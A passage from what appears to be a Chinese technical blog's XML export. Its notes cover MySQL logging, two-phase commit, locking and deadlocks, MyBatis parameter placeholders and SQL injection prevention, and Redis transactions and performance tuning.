</li>
<li class="lvl-2">
<p>从库会创建一个用于回放 binlog 的线程，去读 relay log 中继日志，然后回放 binlog 更新存储引擎中的数据，最终实现主从的数据一致性。</p>
</li>
</ul>
<h2 id="5-3-两阶段提交（redo-log、binlog）">5.3 两阶段提交（redo log、binlog）</h2>
<blockquote>
<p>redo log在事务开始前写，binlog在事务提交时写</p>
</blockquote>
<p><code>redo log</code>（重做日志）让<code>InnoDB</code>存储引擎拥有了崩溃恢复能力。<code>binlog</code>（归档日志）保证了<code>MySQL</code>集群架构的数据一致性。</p>
<p>事务提交后，redo log 和 binlog 都要持久化到磁盘，但是这两个是独立的逻辑，可能出现半成功的状态，这样就造成两份日志之间的逻辑不一致。<code>redo log 影响主库的数据，binlog 影响从库的数据</code>，所以 redo log 和 binlog 必须保持一致才能保证主从数据一致。</p>
<h3 id="5-3-1-存在问题">5.3.1 存在问题</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>先写 redo log 直接提交，然后写 binlog</strong>，假设写完 redo log 后，机器挂了，binlog 日志没有被写入，那么机器重启后，这台机器会通过 redo log 恢复数据，但是这个时候 binlog 并没有记录该数据，后续进行机器备份的时候，就会丢失这一条数据，同时主从同步也会丢失这一条数据。</p>
</li>
<li class="lvl-2">
<p><strong>先写 binlog，然后写 redo log</strong>，假设写完了 binlog，机器异常重启了，由于没有 redo log，本机是无法恢复这一条记录的，但是 binlog 又有记录，那么和上面同样的道理，就会产生数据不一致的情况。</p>
</li>
</ul>
<h3 id="5-3-2-过程">5.3.2 过程</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>记录 redo log，此时 redo log 进入 prepare 状态，然后告诉执行器，执行完成了，随时可以提交。</p>
</li>
<li class="lvl-2">
<p>执行器收到通知后记录 binlog，然后调用引擎接口，提交 redo log 为提交状态。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405142133306.png" alt="image.png"></p>
<p>将redo log的写入拆成了两个步骤：prepare和commit，中间再穿插写入binlog：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>prepare 阶段</strong>：将 XID（内部 XA 事务的 ID） 写入到 redo log，同时<code>将 redo log 对应的事务状态设置为 prepare</code>，然后将 redo log 持久化到磁盘（innodb_flush_log_at_trx_commit = 1 的作用）；</p>
</li>
<li class="lvl-2">
<p><strong>commit 阶段</strong>：把 XID 写入到 binlog，然后将 binlog 持久化到磁盘（sync_binlog = 1 的作用），接着调用引擎的提交事务接口，<code>将 redo log 状态设置为 commit</code>，此时该状态并不需要持久化到磁盘，只需要 write 到文件系统的 page cache 中就够了，因为只要 binlog 写磁盘成功，就算 redo log 的状态还是 prepare 也没有关系，一样会被认为事务已经执行成功</p>
</li>
</ul>
<h1>6 MySQL磁盘I/O很高，优化方法</h1>
<p>事务在提交的时候，需要将 binlog 和 redo log 持久化到磁盘，那么如果出现 MySQL 磁盘 I/O 很高的现象，我们可以通过控制以下参数，来 “延迟” binlog 和 redo log 刷盘的时机，从而降低磁盘 I/O 的频率：</p>
<h1>7 架构</h1>
<h2 id="7-1-主从复制">7.1 主从复制</h2>
<p>MySQL 集群的主从复制过程梳理成 3 个阶段：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>写入 Binlog：主库写 binlog 日志，提交事务，并更新本地存储数据。</p>
</li>
<li class="lvl-2">
<p>同步 Binlog：把 binlog 复制到所有从库上，每个从库把 binlog 写到暂存日志中。</p>
</li>
<li class="lvl-2">
<p>回放 Binlog：回放 binlog，并更新存储引擎中的数据。</p>
</li>
</ul>
<p>具体详细过程如下：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>MySQL 主库在收到客户端提交事务的请求之后，会先写入 binlog，再提交事务，更新存储引擎中的数据，事务提交完成后，返回给客户端“操作成功”的响应。</p>
</li>
<li class="lvl-2">
<p>从库会创建一个专门的 I/O 线程，连接主库的 log dump 线程，来接收主库的 binlog 日志，再把 binlog 信息写入 relay log 的中继日志里，再返回给主库“复制成功”的响应。</p>
</li>
<li class="lvl-2">
<p>从库会创建一个用于回放 binlog 的线程，去读 relay log 中继日志，然后回放 binlog 更新存储引擎中的数据，最终实现主从的数据一致性。</p>
</li>
</ul>
<h2 id="7-2-分库分表">7.2 分库分表</h2>
<p>分库是一种水平扩展数据库的技术，将数据根据一定规则划分到多个独立的数据库中。每个数据库只负责存储部分数据，实现了数据的拆分和分布式存储。分库主要是为了解决<mark>并发连接过多，单机 mysql扛不住</mark>的问题。</p>
<p>分表指的是将单个数据库中的表拆分成多个表，每个表只负责存储一部分数据。这种数据的垂直划分能够提高查询效率，减轻单个表的压力。分表主要是为了解决<mark>单表数据量太大，导致查询性能下降</mark>的问题。</p>
<p><a href="https://xiaolincoding.com/interview/mysql.html#%E4%B8%BB%E4%BB%8E%E5%BB%B6%E8%BF%9F%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95">MySQL面试题 | 小林coding (xiaolincoding.com)</a></p>
<h1>8 参考</h1>
<p><a href="https://javaguide.cn/database/mysql/mysql-logs.html">MySQL三大日志(binlog、redo log和undo log)详解 | JavaGuide</a></p>
<p><a href="https://xiaolincoding.com/mysql/buffer_pool/buffer_pool.html#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%9C%89-buffer-pool">揭开 Buffer Pool 的面纱 | 小林coding (xiaolincoding.com)</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL(4)：锁、其他</title>
    <url>/2024/04/19/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL(4)%EF%BC%9A%E9%94%81%E3%80%81%E5%85%B6%E4%BB%96/</url>
    <content><![CDATA[<h1>1 锁</h1>
<h2 id="1-1-全局锁">1.1 全局锁</h2>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">flush <span class="keyword">tables</span> <span class="keyword">with</span> <span class="keyword">read</span> <span class="keyword">lock</span></span><br></pre></td></tr></table></figure>
<p>加上全局锁，意味着整个数据库都是只读状态。</p>
<h2 id="1-2-表级锁">1.2 表级锁</h2>
<h3 id="1-2-1-表锁">1.2.1 表锁</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>表级别的共享锁，也就是读锁；</span><br><span class="line">lock tables t_student read;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>表级别的独占锁，也就是写锁；</span><br><span class="line">lock tables t_stuent write;</span><br><span class="line"></span><br><span class="line">unlock tables</span><br></pre></td></tr></table></figure>
<h3 id="1-2-2-元数据锁（MDL）">1.2.2 元数据锁（MDL）</h3>
<blockquote>
<p>MDL 是为了保证当用户对表执行 CRUD 操作时，防止其他线程对这个表结构做了变更。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>对一张表进行 CRUD 操作时，加的是 <strong>MDL 读锁</strong>；</p>
</li>
<li class="lvl-2">
<p>对一张表做结构变更操作的时候，加的是 <strong>MDL 写锁</strong>；当有线程在执行 select 语句（ 加 MDL 读锁）的期间，如果有其他线程要更改该表的结构（ 申请 MDL 写锁），那么将会被阻塞，直到执行完 select 语句（ 释放 MDL 读锁）。</p>
</li>
</ul>
<p>反之，当有线程对表结构进行变更（ 加 MDL 写锁）的期间，如果有其他线程执行了 CRUD 操作（ 申请 MDL 读锁），那么就会被阻塞，直到表结构变更完成（ 释放 MDL 写锁）。</p>
<h3 id="1-2-3-意向锁">1.2.3 意向锁</h3>
<blockquote>
<p>意向锁用于在获取表锁时，判断是否有记录已经加锁</p>
</blockquote>
<p>如果需要用到表锁的话，如何判断表中的记录没有行锁呢，一行一行遍历肯定是不行，性能太差。我们需要用到一个叫做意向锁的东东来快速判断是否可以对某个表使用表锁。</p>
<p>意向锁是表级锁，共有两种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>意向共享锁（Intention Shared Lock，IS 锁）</strong>：事务有意向对表中的某些记录加共享锁（S 锁），加共享锁前必须先取得该表的 IS 锁。</p>
</li>
<li class="lvl-2">
<p><strong>意向排他锁（Intention Exclusive Lock，IX 锁）</strong>：事务有意向对表中的某些记录加排他锁（X 锁），加排他锁之前必须先取得该表的 IX 锁。</p>
</li>
<li class="lvl-2">
<p>在使用 InnoDB 引擎的表里对某些记录加上「共享锁」之前，需要先在表级别加上一个「意向共享锁」；</p>
</li>
<li class="lvl-2">
<p>在使用 InnoDB 引擎的表里对某些纪录加上「独占锁」之前，需要先在表级别加上一个「意向独占锁」；</p>
</li>
</ul>
<p>也就是，当执行插入、更新、删除操作，需要先对表加上「<strong>意向独占锁</strong>」，然后对该记录加独占锁。</p>
<p>而普通的 select 是不会加行级锁的，普通的 select 语句是利用 MVCC 实现一致性读，是无锁的。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先在表上加上意向共享锁，然后对读取的记录加共享锁</span></span><br><span class="line"><span class="function"><span class="title">select</span></span> ... lock in share mode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先表上加上意向独占锁，然后对读取的记录加独占锁</span></span><br><span class="line"><span class="function"><span class="title">select</span></span> ... <span class="keyword">for</span> update;</span><br></pre></td></tr></table></figure>
<p><strong>意向共享锁和意向独占锁是表级锁，不会和行级的共享锁和独占锁发生冲突，而且意向锁之间也不会发生冲突，只会和共享表锁（<em>lock tables … read</em>）和独占表锁（<em>lock tables … write</em>）发生冲突。</strong></p>
<p>意向锁的目的是为了<mark>快速判断表里是否有记录被加锁</mark>。</p>
<h3 id="1-2-4-AUTO-INC-锁-自增锁">1.2.4 AUTO-INC 锁(自增锁)</h3>
<p><strong>在插入数据时，会加一个表级别的 AUTO-INC 锁</strong>，然后为被 <code>AUTO_INCREMENT</code> 修饰的字段赋值递增的值，等插入语句执行完成后，才会把 AUTO-INC 锁释放掉。</p>
<h2 id="1-3-行级锁">1.3 行级锁</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Record Lock，记录锁，也就是仅仅把一条记录锁上；</p>
</li>
<li class="lvl-2">
<p>Gap Lock，间隙锁，锁定一个范围，但是不包含记录本身；</p>
</li>
<li class="lvl-2">
<p>Next-Key Lock：Record Lock + Gap Lock 的组合，锁定一个范围，并且锁定记录本身。</p>
</li>
</ul>
<h3 id="1-3-1-Record-Lock（记录锁）">1.3.1 Record Lock（记录锁）</h3>
<p>Record Lock 称为记录锁，锁住的是一条记录。而且记录锁是有 S 锁和 X 锁之分的：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>当一个事务对一条记录加了 S 型记录锁后，其他事务也可以继续对该记录加 S 型记录锁（S 型与 S 锁兼容），但是不可以对该记录加 X 型记录锁（S 型与 X 锁不兼容）;</p>
</li>
<li class="lvl-2">
<p>当一个事务对一条记录加了 X 型记录锁后，其他事务既不可以对该记录加 S 型记录锁（S 型与 X 锁不兼容），也不可以对该记录加 X 型记录锁（X 型与 X 锁不兼容）。</p>
</li>
</ul>
<h3 id="1-3-2-Gap-Lock（间隙锁）">1.3.2 Gap Lock（间隙锁）</h3>
<p>Gap Lock 称为间隙锁，只存在于可重复读隔离级别，目的是为了解决可重复读隔离级别下幻读的现象。</p>
<p>间隙锁虽然存在 X 型间隙锁和 S 型间隙锁，但是并没有什么区别，<strong>间隙锁之间是兼容的，即两个事务可以同时持有包含共同间隙范围的间隙锁，并不存在互斥关系，因为间隙锁的目的是防止插入幻影记录而提出的</strong>。</p>
<p>间隙锁的意义只在于阻止区间被插入，因此是可以共存的。一个事务获取的间隙锁不会阻止另一个事务获取同一个间隙范围的间隙锁，共享（S型）和排他（X型）的间隙锁是没有区别的，他们相互不冲突，且功能相同。</p>
<h3 id="1-3-3-Next-Key-Lock（临键锁）">1.3.3 Next-Key Lock（临键锁）</h3>
<p>Next-Key Lock 称为临键锁，是 Record Lock + Gap Lock 的组合，锁定一个范围，并且锁定记录本身。所以，next-key lock 即能保护该记录，又能阻止其他事务将新纪录插入到被保护记录前面的间隙中。</p>
<p><strong>next-key lock 是包含间隙锁+记录锁的，如果一个事务获取了 X 型的 next-key lock，那么另外一个事务在获取相同范围的 X 型的 next-key lock 时，是会被阻塞的</strong>。</p>
<p>虽然相同范围的间隙锁是多个事务相互兼容的，但对于记录锁，我们是要考虑 X 型与 S 型关系，X 型的记录锁与 X 型的记录锁是冲突的。</p>
<h3 id="1-3-4-插入意向锁">1.3.4 插入意向锁</h3>
<p>一个事务在插入一条记录的时候，需要判断插入位置是否已被其他事务加了间隙锁（next-key lock 也包含间隙锁）。</p>
<p>如果有的话，插入操作就会发生<strong>阻塞</strong>，直到拥有间隙锁的那个事务提交为止（释放间隙锁的时刻），在此期间会生成一个<strong>插入意向锁</strong>，表明有事务想在某个区间插入新记录，但是现在处于等待状态。</p>
<p>假设事务 A 已经对表加了一个范围 id 为（3，5）间隙锁。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410172147376.png" alt="image.png"></p>
<p>当事务 A 还没提交的时候，事务 B 向该表插入一条 id = 4 的新记录，这时会判断到插入的位置已经被事务 A 加了间隙锁，于是事物 B 会生成一个插入意向锁，然后将锁的状态设置为等待状态（PS：MySQL 加锁时，是先生成锁结构，然后设置锁的状态，如果锁状态是等待状态，并不是意味着事务成功获取到了锁，只有当锁状态为正常状态时，才代表事务成功获取到了锁），此时事务 B 就会发生阻塞，直到事务 A 提交了事务。</p>
<p>插入意向锁名字虽然有意向锁，但是它并不是意向锁，它是一种特殊的间隙锁，属于行级别锁。 如果说间隙锁锁住的是一个区间，那么「插入意向锁」锁住的就是一个点。因而从这个角度来说，插入意向锁确实是一种特殊的间隙锁。</p>
<p>插入意向锁与间隙锁的另一个非常重要的差别是：尽管「插入意向锁」也属于间隙锁，但两个事务却不能在同一时间内，一个拥有间隙锁，另一个拥有该间隙区间内的插入意向锁（当然，插入意向锁如果不在间隙锁区间内则是可以的）。</p>
<h1>2 其他</h1>
<h2 id="2-1-drop、delete、truncate">2.1 drop、delete、truncate</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Drop直接删掉表;</p>
</li>
<li class="lvl-2">
<p>Truncate删除表中数据，再插入时自增长id又从1开始 ;</p>
</li>
<li class="lvl-2">
<p>Delete删除表中数据，可以加where字句。</p>
</li>
</ul>
<h2 id="2-2-视图、游标">2.2 视图、游标</h2>
<p>视图是一种虚拟的表，通常是有一个表或者多个表的行或列的子集，具有和物理表相同的功能 游标是对查询出来的结果集作为一个单元来有效的处理。一般不使用游标，但是需要逐条处理数据的时候，游标显得十分重要。</p>
<h1>3 问题</h1>
<p><a href="https://juejin.cn/post/6936083717051908104#heading-1">搜狐三面：说说你是怎么解决MySQL死锁问题的！咱们使用 MySQL 大概率上都会遇到死锁问题，这实在是个令人非常头痛的 - 掘金 (juejin.cn)</a></p>
<h2 id="3-1-事务并发-insert-唯一键冲突">3.1 事务并发 insert 唯一键冲突</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410081703202.png" alt="image.png"></p>
<p>1.事务 T2 insert into t7(id,a) values (26,10) 语句 insert 成功，持有 a=10 的 排他行锁( X locks rec but no gap )</p>
<p>2.事务 T1 insert into t7(id,a) values (30,10), 因为T2的第一条 insert 已经插入 a=10 的记录,</p>
<p>事务 T1 insert a=10 则发生唯一键冲突,需要申请对冲突的唯一索引加上S Next-key Lock</p>
<p>( 即 lock mode S waiting ) 这是一个间隙锁会申请锁住(,10],(10,20]之间的 gap 区域。</p>
<p>3.事务 T2 insert into t7(id,a) values (40，9)该语句插入的 a=9 的值在事务 T1 申请的 gap 锁</p>
<p>4,10之间， 故需事务 T2 的第二条 insert 语句要等待事务 T1 的 S-Next-key Lock 锁释放</p>
<h2 id="3-2-转账问题">3.2 转账问题</h2>
<p><code>所有的交易都先获取更小的锁，获取到了小的锁才能获取大锁</code>，这就避免了环形的<a href="https://so.csdn.net/so/search?q=%E6%AD%BB%E9%94%81&amp;spm=1001.2101.3001.7020">死锁</a>，假如说这两个锁的大小一样，这时候就需要一把额外的锁来进行交易流程的控制。</p>
<p><a href="https://blog.csdn.net/qq_42672654/article/details/106439260">银行转账的死锁问题_a往b转钱,b往a转钱,同时的会死锁吗?如何解决死锁?-CSDN博客</a></p>
<p>本文使用<code>死锁避免策略</code>：把获取两把锁的规则改一下，原来的规则是先获取转出人的锁，再获取收款人的锁，这就会造成两个转出人都在等对方释放锁的情况。</p>
<p>现在我们把规则改成：所有的交易都先获取<code>hash</code>值更小的锁，获取到了<code>hash</code>小的锁才能获取<code>hash</code>大的锁，这就避免了环形的死锁，假如说这两个锁的大小一样，这时候就需要一把额外的锁来进行交易流程的控制，相当于一场“加时赛”。</p>
<p>在实际业务开发中可以使用主键，因为主键是唯一的，可以用主键来决定获取锁的顺序。</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3NDgyMTIxMw==&amp;mid=2247484738&amp;idx=3&amp;sn=2640184c66abfbdc5054d6a252b8388c&amp;chksm=fd2dc370ca5a4a66b2dec9d6a487139d7638a20a8452e959574ca46c7f64c606e3f83125a378#rd">银行转账问题（死锁） (qq.com)</a></p>
<h2 id="3-3-间隙锁">3.3 间隙锁</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410162217476.png" alt="image.png"></p>
<p>间隙锁的意义只在于阻止区间被插入，因此是可以共存的。一个事务获取的间隙锁不会阻止另一个事务获取同一个间隙范围的间隙锁，共享（S型）和排他（X型）的间隙锁是没有区别的，他们相互不冲突，且功能相同。</p>
<p>尽管「插入意向锁」也属于间隙锁，但两个事务却不能在同一时间内，一个拥有间隙锁，另一个拥有该间隙区间内的插入意向锁（当然，插入意向锁如果不在间隙锁区间内则是可以的）。所以，插入意向锁和间隙锁之间是冲突的。</p>
<table>
<thead>
<tr>
<th style="text-align:left">事务A</th>
<th>事务B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">(20,30)间隙锁</td>
<td></td>
</tr>
<tr>
<td style="text-align:left"></td>
<td>(20,30)间隙锁</td>
</tr>
<tr>
<td style="text-align:left">插入意向锁</td>
<td></td>
</tr>
<tr>
<td style="text-align:left"></td>
<td>插入意向锁</td>
</tr>
</tbody>
</table>
<p>事务 A 和事务 B 在执行完后 update 语句后都持有范围为(20, 30）的间隙锁，而接下来的插入操作为了获取到插入意向锁，都在等待对方事务的间隙锁释放，于是就造成了循环等待，满足了死锁的四个条件：互斥、占有且等待、不可强占用、循环等待，因此发生了死锁。</p>
<p><a href="https://xiaolincoding.com/mysql/lock/show_lock.html">字节面试：加了什么锁，导致死锁的？ | 小林coding (xiaolincoding.com)</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/08/27/%E6%95%B0%E6%8D%AE%E5%BA%93/Mybatis/</url>
    <content><![CDATA[<blockquote>
<p>[!question] #{} 和 ${} 的区别是什么？</p>
<ul class="lvl-1">
<li class="lvl-2"><code>$&#123;&#125;</code>是 Properties 文件中的<mark>变量占位符</mark>，它可以用于标签属性值和 sql 内部，属于原样文本替换，可以替换任意内容，比如${driver}会被原样替换为<code>com.mysql.jdbc. Driver</code>。</li>
<li class="lvl-2"><code>#&#123;&#125;</code>是 sql 的<mark>参数占位符</mark>，MyBatis 会将 sql 中的<code>#&#123;&#125;</code>替换为? 号，在 sql 执行前会使用 PreparedStatement 的参数设置方法，按序给 sql 的? 号占位符设置参数值，比如 ps.setInt(0, parameterValue)，<code>#&#123;item.name&#125;</code> 的取值方式为使用反射从参数对象中获取 item 对象的 name 属性值，相当于 <code>param.getItem().getName()</code>。</li>
<li class="lvl-2">符号$，它会把参数值直接进行替换，而不会进行预编译（如果使用占位符#，就会进行预编译，从而可以防止SQL注入</li>
</ul>
</blockquote>
<h1>1 MyBatis避免SQL注入</h1>
<h1>2 SQL语句映射模式</h1>
<p>基于xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--结果集映射(ORM)--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;entity.UserEntity&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- propery表示UserEntity属性名，column表示tb_user表字段名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;userName&quot;</span> <span class="attr">column</span>=<span class="string">&quot;user_name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;birthday&quot;</span> <span class="attr">column</span>=<span class="string">&quot;birthday&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;created&quot;</span> <span class="attr">column</span>=<span class="string">&quot;created&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;updated&quot;</span> <span class="attr">column</span>=<span class="string">&quot;updated&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--select查询语句 id表示接口方法名 resultMap表示引用结果集映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUserByAge&quot;</span>  <span class="attr">resultMap</span>=<span class="string">&quot;userResultMap&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_user where age &gt; #&#123;age&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>基于注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from tb_user where age &gt; #&#123;age&#125;&quot;)</span></span><br><span class="line"><span class="meta">@Results(value = &#123;</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;id&quot;,column = &quot;id&quot;,id = true),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;userName&quot;,column = &quot;userName&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;password&quot;,column = &quot;password&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;name&quot;,column = &quot;name&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;sex&quot;,column = &quot;sex&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;age&quot;,column = &quot;age&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;birthday&quot;,column = &quot;birthday&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;created&quot;,column = &quot;created&quot;),</span></span><br><span class="line"><span class="meta">            @Result(property = &quot;updated&quot;,column = &quot;updated&quot;)</span></span><br><span class="line"><span class="meta"> &#125;)</span></span><br><span class="line"> <span class="keyword">public</span> List&lt;UserEntity&gt; <span class="title function_">selectUserByAge</span><span class="params">(<span class="meta">@Param(&quot;age&quot;)</span> <span class="type">int</span> age)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Redis(2)：性能优化、集群</title>
    <url>/2024/03/21/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis(2)%EF%BC%9A%E4%BA%8B%E5%8A%A1%E3%80%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E3%80%81%E9%9B%86%E7%BE%A4/</url>
    <content><![CDATA[<h1>1 Redis事务</h1>
<p><strong>Redis 事务提供了一种将多个命令请求打包的功能。然后，再按顺序执行打包的所有命令，并且不会被中途打断</strong>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>不满足原子性和持久性，事务中的每条命令都会与 Redis 服务器进行网络交互</p>
</li>
<li class="lvl-2">
<p>Redis 事务在运行错误的情况下，除了执行过程中出现错误的命令外，其他命令都能正常执行。并且，Redis 事务是不支持回滚（roll back）操作的。因此，Redis 事务其实是<mark>不满足原子性</mark>的。</p>
</li>
<li class="lvl-2">
<p>AOF 持久化的<code>fsync</code>策略为 no、everysec 时都会存在数据丢失的情况 。always 下可以基本是可以满足持久性要求的，但性能太差，实际开发过程中不会使用。因此，Redis 事务的持久性也是没办法保证的。</p>
</li>
</ul>
<p>除了不满足原子性和持久性之外，事务中的每条命令都会与 Redis 服务器进行网络交互，这是比较浪费资源的行为。明明一次批量执行多个命令就可以了，这种操作实在是看不懂。</p>
<p>Redis 可以通过 <strong><code>MULTI</code>，<code>EXEC</code>，<code>DISCARD</code> 和 <code>WATCH</code></strong> 等命令来实现事务(Transaction)功能。<br>
<a href="https://redis.io/commands/multi"><code>MULTI</code></a> 命令后可以输入多个命令，Redis 不会立即执行这些命令，而是将它们放到队列，当调用了 <a href="https://redis.io/commands/exec"><code>EXEC</code></a> 命令后，再执行所有的命令</p>
<p>这个过程是这样的：</p>
<ol>
<li class="lvl-3">
<p>开始事务（<code>MULTI</code>）；</p>
</li>
<li class="lvl-3">
<p>命令入队(批量操作 Redis 的命令，先进先出（FIFO）的顺序执行)；</p>
</li>
<li class="lvl-3">
<p>执行事务(<code>EXEC</code>)。</p>
</li>
</ol>
<p>你也可以通过 <a href="https://redis.io/commands/discard"><code>DISCARD</code></a> 命令取消一个事务，它会清空事务队列中保存的所有命令。</p>
<h1>2 Redis阻塞</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>O(n)命令</p>
</li>
<li class="lvl-2">
<p>SAVE 创建 RDB 快照</p>
</li>
<li class="lvl-2">
<p>AOF刷盘阻塞</p>
</li>
<li class="lvl-2">
<p>AOF重写阻塞</p>
</li>
<li class="lvl-2">
<p>删除大key</p>
</li>
</ul>
<h1>3 <mark>Redis性能优化</mark></h1>
<h2 id="3-1-使用批量操作减少网络传输">3.1 使用批量操作减少网络传输</h2>
<ol>
<li class="lvl-3">
<p>发送命令</p>
</li>
<li class="lvl-3">
<p>命令排队</p>
</li>
<li class="lvl-3">
<p>命令执行</p>
</li>
<li class="lvl-3">
<p>返回结果其中，第 1 步和第 4 步耗费时间之和称为 <strong>Round Trip Time (RTT,往返时间)</strong> ，也就是数据在网络上传输的时间。</p>
</li>
</ol>
<p>使用批量操作可以减少网络传输次数，进而有效减小网络开销，大幅减少 RTT。</p>
<ul class="lvl-0">
<li class="lvl-3">
<p>原生批量操作：Redis原生批量操作命令</p>
</li>
<li class="lvl-3">
<p>pipeline：将一批 Redis 命令封装成一组，这些 Redis 命令会被一次性提交到 Redis 服务器，只需要一次网络传输</p>
</li>
<li class="lvl-3">
<p>Lua脚本：一段 Lua 脚本可以视作一条命令执行，可以看作是 <strong>原子操作</strong> 。</p>
</li>
</ul>
<h2 id="3-2-大量key集中过期问题">3.2 大量key集中过期问题</h2>
<p>定期任务线程在Redis主线程中执行，在遇到大量过期key时，客户端需等待定期清理过期key任务线程执行完成。导致客户端请求没办法被及时处理，响应速度会比较慢。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>key设置随机过期时间</p>
</li>
<li class="lvl-2">
<p>开启惰性删除，异步删除</p>
</li>
</ul>
<h2 id="3-3-Bigkey">3.3 Bigkey</h2>
<blockquote>
<p>key对应的value所占用的内存比较大，或者元素比较多</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>分割 bigkey</strong>：将一个 bigkey 分割为多个小 key。例如，将一个含有上万字段数量的 Hash 按照一定策略（比如二次哈希）拆分为多个 Hash。</p>
</li>
<li class="lvl-2">
<p><strong>手动清理</strong>：Redis 4.0+ 可以使用 <code>UNLINK</code> 命令来异步删除一个或多个指定的 key。Redis 4.0 以下可以考虑使用 <code>SCAN</code> 命令结合 <code>DEL</code> 命令来分批次删除。<code>DEL</code>命令删除会阻塞主线程。</p>
</li>
<li class="lvl-2">
<p><strong>采用合适的数据结构</strong>：例如，文件二进制数据不使用 String 保存、使用 HyperLogLog 统计页面 UV、Bitmap 保存状态信息（0/1）。</p>
</li>
<li class="lvl-2">
<p><strong>开启 lazy-free（惰性删除/延迟释放）</strong> ：lazy-free 特性是 Redis 4.0 开始引入的，指的是让 Redis 采用异步方式延迟释放 key 使用的内存，将该操作交给单独的子线程处理，避免阻塞主线程。</p>
</li>
</ul>
